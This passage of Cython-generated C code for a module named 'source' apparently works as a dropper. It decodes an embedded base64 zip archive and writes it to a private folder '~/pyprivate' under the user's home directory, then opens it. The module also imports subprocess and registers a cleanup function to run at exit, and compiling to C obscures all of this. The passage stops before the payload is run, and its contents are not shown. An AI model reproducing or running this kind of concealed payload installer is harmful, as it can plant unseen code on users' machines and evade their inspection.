  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  PyObject *__pyx_t_11 = NULL;
  PyObject *__pyx_t_12 = NULL;
  int __pyx_t_13;
  PyObject *__pyx_t_14 = NULL;
  int __pyx_t_15;
  char const *__pyx_t_16;
  PyObject *__pyx_t_17 = NULL;
  PyObject *__pyx_t_18 = NULL;
  PyObject *__pyx_t_19 = NULL;
  PyObject *__pyx_t_20 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  if (__pyx_m) {
    if (__pyx_m == __pyx_pyinit_module) return 0;
    PyErr_SetString(PyExc_RuntimeError, "Module 'source' has already been imported. Re-initialisation is not supported.");
    return -1;
  }
  #elif PY_MAJOR_VERSION >= 3
  if (__pyx_m) return __Pyx_NewRef(__pyx_m);
  #endif
  #if CYTHON_REFNANNY
__Pyx_RefNanny = __Pyx_RefNannyImportAPI("refnanny");
if (!__Pyx_RefNanny) {
  PyErr_Clear();
  __Pyx_RefNanny = __Pyx_RefNannyImportAPI("Cython.Runtime.refnanny");
  if (!__Pyx_RefNanny)
      Py_FatalError("failed to import 'refnanny' module");
}
#endif
  __Pyx_RefNannySetupContext("__Pyx_PyMODINIT_FUNC PyInit_source(void)", 0);
  if (__Pyx_check_binary_version() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #ifdef __Pxy_PyFrame_Initialize_Offsets
  __Pxy_PyFrame_Initialize_Offsets();
  #endif
  __pyx_empty_tuple = PyTuple_New(0); if (unlikely(!__pyx_empty_tuple)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_empty_bytes = PyBytes_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_bytes)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_empty_unicode = PyUnicode_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_unicode)) __PYX_ERR(0, 4, __pyx_L1_error)
  #ifdef __Pyx_CyFunction_USED
  if (__pyx_CyFunction_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_FusedFunction_USED
  if (__pyx_FusedFunction_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Coroutine_USED
  if (__pyx_Coroutine_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Generator_USED
  if (__pyx_Generator_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_AsyncGen_USED
  if (__pyx_AsyncGen_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_StopAsyncIteration_USED
  if (__pyx_StopAsyncIteration_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  /*--- Library function declarations ---*/
  /*--- Threads initialization code ---*/
  #if defined(WITH_THREAD) && PY_VERSION_HEX < 0x030700F0 && defined(__PYX_FORCE_INIT_THREADS) && __PYX_FORCE_INIT_THREADS
  PyEval_InitThreads();
  #endif
  /*--- Module creation code ---*/
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  __pyx_m = __pyx_pyinit_module;
  Py_INCREF(__pyx_m);
  #else
  #if PY_MAJOR_VERSION < 3
  __pyx_m = Py_InitModule4("source", __pyx_methods, 0, 0, PYTHON_API_VERSION); Py_XINCREF(__pyx_m);
  #else
  __pyx_m = PyModule_Create(&__pyx_moduledef);
  #endif
  if (unlikely(!__pyx_m)) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  __pyx_d = PyModule_GetDict(__pyx_m); if (unlikely(!__pyx_d)) __PYX_ERR(0, 4, __pyx_L1_error)
  Py_INCREF(__pyx_d);
  __pyx_b = PyImport_AddModule(__Pyx_BUILTIN_MODULE_NAME); if (unlikely(!__pyx_b)) __PYX_ERR(0, 4, __pyx_L1_error)
  Py_INCREF(__pyx_b);
  __pyx_cython_runtime = PyImport_AddModule((char *) "cython_runtime"); if (unlikely(!__pyx_cython_runtime)) __PYX_ERR(0, 4, __pyx_L1_error)
  Py_INCREF(__pyx_cython_runtime);
  if (PyObject_SetAttrString(__pyx_m, "__builtins__", __pyx_b) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  /*--- Initialize various global constants etc. ---*/
  if (__Pyx_InitGlobals() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #if PY_MAJOR_VERSION < 3 && (__PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT)
  if (__Pyx_init_sys_getdefaultencoding_params() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  if (__pyx_module_is_main_source) {
    if (PyObject_SetAttr(__pyx_m, __pyx_n_s_name, __pyx_n_s_main) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  }
  #if PY_MAJOR_VERSION >= 3
  {
    PyObject *modules = PyImport_GetModuleDict(); if (unlikely(!modules)) __PYX_ERR(0, 4, __pyx_L1_error)
    if (!PyDict_GetItemString(modules, "source")) {
      if (unlikely(PyDict_SetItemString(modules, "source", __pyx_m) < 0)) __PYX_ERR(0, 4, __pyx_L1_error)
    }
  }
  #endif
  /*--- Builtin init code ---*/
  if (__Pyx_InitCachedBuiltins() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  /*--- Constants init code ---*/
  if (__Pyx_InitCachedConstants() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  /*--- Global type/function init code ---*/
  (void)__Pyx_modinit_global_init_code();
  (void)__Pyx_modinit_variable_export_code();
  (void)__Pyx_modinit_function_export_code();
  (void)__Pyx_modinit_type_init_code();
  (void)__Pyx_modinit_type_import_code();
  (void)__Pyx_modinit_variable_import_code();
  (void)__Pyx_modinit_function_import_code();
  /*--- Execution code ---*/
  #if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
  if (__Pyx_patch_abc() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_os, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_os, __pyx_t_1) < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_shutil, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_shutil, __pyx_t_1) < 0) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_zipfile, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_zipfile, __pyx_t_1) < 0) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_subprocess, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_subprocess, __pyx_t_1) < 0) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_base64, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_base64, __pyx_t_1) < 0) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_atexit, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 10, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_atexit, __pyx_t_1) < 0) __PYX_ERR(0, 10, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_os); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_path); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_expanduser); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__3, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_MyHome, __pyx_t_2) < 0) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 12, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_path); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 12, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_join); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 12, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_MyHome); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 12, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_3 = PyTuple_New(2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 12, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_t_1);
  __Pyx_INCREF(__pyx_kp_u_pyprivate);
  __Pyx_GIVEREF(__pyx_kp_u_pyprivate);
  PyTuple_SET_ITEM(__pyx_t_3, 1, __pyx_kp_u_pyprivate);
  __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_t_3, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 12, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Pyprivate, __pyx_t_1) < 0) __PYX_ERR(0, 12, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_6source_1cleanup, 0, __pyx_n_s_cleanup, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__4)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 15, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_cleanup, __pyx_t_1) < 0) __PYX_ERR(0, 15, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_atexit); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 24, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_register); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 24, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_cleanup); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 24, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 24, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_AH, __pyx_kp_u_UEsDBBQAAAAIAGKIp1o7jcMKkwEAADYC) < 0) __PYX_ERR(0, 25, __pyx_L1_error)

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_base64); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_b64decode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_AH); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Dev, __pyx_t_3) < 0) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_os); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 27, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_path); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 27, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_exists); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 27, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_Pyprivate); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 27, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 27, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_4 = __Pyx_PyObject_IsTrue(__pyx_t_1); if (unlikely(__pyx_t_4 < 0)) __PYX_ERR(0, 27, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_5 = ((!__pyx_t_4) != 0);
  if (__pyx_t_5) {

    
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_os); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 28, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_makedirs); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 28, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_Pyprivate); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 28, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 28, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

    
  }

  
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_os); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 30, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_path); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 30, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_join); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 30, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_Pyprivate); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 30, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = PyTuple_New(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 30, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_t_1);
  __Pyx_INCREF(__pyx_n_u_CanYou);
  __Pyx_GIVEREF(__pyx_n_u_CanYou);
  PyTuple_SET_ITEM(__pyx_t_2, 1, __pyx_n_u_CanYou);
  __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_t_2, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 30, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Mahos, __pyx_t_1) < 0) __PYX_ERR(0, 30, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  /*with:*/ {
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_Mahos); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 31, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_2 = PyTuple_New(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 31, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_GIVEREF(__pyx_t_1);
    PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_t_1);
    __Pyx_INCREF(__pyx_n_u_wb);
    __Pyx_GIVEREF(__pyx_n_u_wb);
    PyTuple_SET_ITEM(__pyx_t_2, 1, __pyx_n_u_wb);
    __pyx_t_1 = 0;
    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_2, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 31, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_6 = __Pyx_PyObject_LookupSpecial(__pyx_t_1, __pyx_n_s_exit); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 31, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_2 = __Pyx_PyObject_LookupSpecial(__pyx_t_1, __pyx_n_s_enter); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 31, __pyx_L3_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_3 = __Pyx_PyObject_CallNoArg(__pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 31, __pyx_L3_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = __pyx_t_3;
    __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    /*try:*/ {
      {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        __Pyx_ExceptionSave(&__pyx_t_7, &__pyx_t_8, &__pyx_t_9);
        __Pyx_XGOTREF(__pyx_t_7);
        __Pyx_XGOTREF(__pyx_t_8);
        __Pyx_XGOTREF(__pyx_t_9);
        /*try:*/ {
          if (PyDict_SetItem(__pyx_d, __pyx_n_s_f, __pyx_t_2) < 0) __PYX_ERR(0, 31, __pyx_L7_error)
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

          
          __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_f); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 32, __pyx_L7_error)
          __Pyx_GOTREF(__pyx_t_2);
          __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_write); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 32, __pyx_L7_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
          __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_Dev); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 32, __pyx_L7_error)
          __Pyx_GOTREF(__pyx_t_2);
          __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 32, __pyx_L7_error)
          __Pyx_GOTREF(__pyx_t_3);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

          
        }
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
        goto __pyx_L12_try_end;
        __pyx_L7_error:;
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        /*except:*/ {
          __Pyx_AddTraceback("source", __pyx_clineno, __pyx_lineno, __pyx_filename);
          if (__Pyx_GetException(&__pyx_t_3, &__pyx_t_2, &__pyx_t_1) < 0) __PYX_ERR(0, 31, __pyx_L9_except_error)
          __Pyx_GOTREF(__pyx_t_3);
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_10 = PyTuple_Pack(3, __pyx_t_3, __pyx_t_2, __pyx_t_1); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 31, __pyx_L9_except_error)
          __Pyx_GOTREF(__pyx_t_10);
          __pyx_t_11 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_t_10, NULL);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
          if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 31, __pyx_L9_except_error)
          __Pyx_GOTREF(__pyx_t_11);
          __pyx_t_5 = __Pyx_PyObject_IsTrue(__pyx_t_11);
          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
          if (__pyx_t_5 < 0) __PYX_ERR(0, 31, __pyx_L9_except_error)
          __pyx_t_4 = ((!(__pyx_t_5 != 0)) != 0);
          if (__pyx_t_4) {
            __Pyx_GIVEREF(__pyx_t_3);
            __Pyx_GIVEREF(__pyx_t_2);
            __Pyx_XGIVEREF(__pyx_t_1);
            __Pyx_ErrRestoreWithState(__pyx_t_3, __pyx_t_2, __pyx_t_1);
            __pyx_t_3 = 0; __pyx_t_2 = 0; __pyx_t_1 = 0; 
            __PYX_ERR(0, 31, __pyx_L9_except_error)
          }
          __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          goto __pyx_L8_exception_handled;
        }
        __pyx_L9_except_error:;
        __Pyx_XGIVEREF(__pyx_t_7);
        __Pyx_XGIVEREF(__pyx_t_8);
        __Pyx_XGIVEREF(__pyx_t_9);
        __Pyx_ExceptionReset(__pyx_t_7, __pyx_t_8, __pyx_t_9);
        goto __pyx_L1_error;
        __pyx_L8_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_7);
        __Pyx_XGIVEREF(__pyx_t_8);
        __Pyx_XGIVEREF(__pyx_t_9);
        __Pyx_ExceptionReset(__pyx_t_7, __pyx_t_8, __pyx_t_9);
        __pyx_L12_try_end:;
      }
    }
    /*finally:*/ {
      /*normal exit:*/{
        if (__pyx_t_6) {
          __pyx_t_9 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_tuple__5, NULL);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 31, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_9);
          __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        }
        goto __pyx_L6;
      }
      __pyx_L6:;
    }
    goto __pyx_L16;
    __pyx_L3_error:;
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    goto __pyx_L1_error;
    __pyx_L16:;
  }

  
  /*with:*/ {
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_zipfile); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 34, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_ZipFile); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 34, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_Mahos); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 34, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_3 = PyTuple_New(2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 34, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_GIVEREF(__pyx_t_1);
    PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_t_1);
    __Pyx_INCREF(__pyx_n_u_r);
    __Pyx_GIVEREF(__pyx_n_u_r);
    PyTuple_SET_ITEM(__pyx_t_3, 1, __pyx_n_u_r);
    __pyx_t_1 = 0;
    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_t_3, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 34, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_6 = __Pyx_PyObject_LookupSpecial(__pyx_t_1, __pyx_n_s_exit); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 34, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_3 = __Pyx_PyObject_LookupSpecial(__pyx_t_1, __pyx_n_s_enter); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 34, __pyx_L17_error)
    __Pyx_GOTREF(__pyx_t_3);
